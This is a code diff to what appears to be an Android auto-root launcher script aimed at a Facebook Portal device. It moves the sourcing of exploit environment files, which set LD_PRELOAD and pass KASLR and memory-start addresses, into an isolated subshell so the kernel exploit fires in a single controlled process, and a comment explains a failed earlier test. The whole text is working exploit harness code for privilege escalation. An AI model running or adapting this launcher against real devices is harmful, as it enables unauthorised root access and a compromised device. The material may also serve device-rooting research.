@@ -9,6 +9,16 @@
 # provisioner at staging time from the same code that builds the host
 # exploit environment (attempt parity selects the retry geometry),
 # minus the two per-boot addresses, which arrive as arguments here.
+#
+# ORDERING MATTERS: the env files export LD_PRELOAD, so every command
+# started after they are sourced becomes an exploit host process.
+# Housekeeping (am, rm, logcat, the attempt banner) must run BEFORE
+# the env is applied, and the env is applied only inside a subshell
+# whose sole job is to exec /system/bin/true. The first live test
+# (2026-11-04) sourced the env first: `am force-stop` loaded the
+# preload, the exploit ran inside the am process, and the script
+# never reached the banner echo or the true invocation — all four
+# attempts produced no attempt.log and no daemon.
 
 KASLR="$1"
 MEMSTART="$2"
@@ -16,20 +26,24 @@ ATTEMPT="$3"
 DIR=/data/local/tmp/portal-autoroot
 LOG=$DIR/attempt.log
 
-if [ $((ATTEMPT % 2)) -eq 0 ]; then
-    . "$DIR/env-even.sh"
-else
-    . "$DIR/env-odd.sh"
-fi
-export GHOSTLOCK_KASLR_BASE="$KASLR"
-export GHOSTLOCK_P0_MEMSTART="$MEMSTART"
-
 am force-stop --user 0 com.facebook.aloha.analytics
 rm -f /data/local/tmp/ghostlock-watch-result.txt
 logcat -c
 
 echo "AUTOROOT_ATTEMPT attempt=$ATTEMPT kaslr=$KASLR memstart=$MEMSTART" >> "$LOG"
-/system/bin/true >> "$LOG" 2>&1
+
+if [ $((ATTEMPT % 2)) -eq 0 ]; then
+    ENV_FILE="$DIR/env-even.sh"
+else
+    ENV_FILE="$DIR/env-odd.sh"
+fi
+
+(
+    . "$ENV_FILE"
+    export GHOSTLOCK_KASLR_BASE="$KASLR"
+    export GHOSTLOCK_P0_MEMSTART="$MEMSTART"
+    exec /system/bin/true
+) >> "$LOG" 2>&1
 
 if grep -q PORTAL_CUSTOM_PAYLOAD_STARTED "$LOG"; then
     echo "RESULT=started" > "$DIR/result"
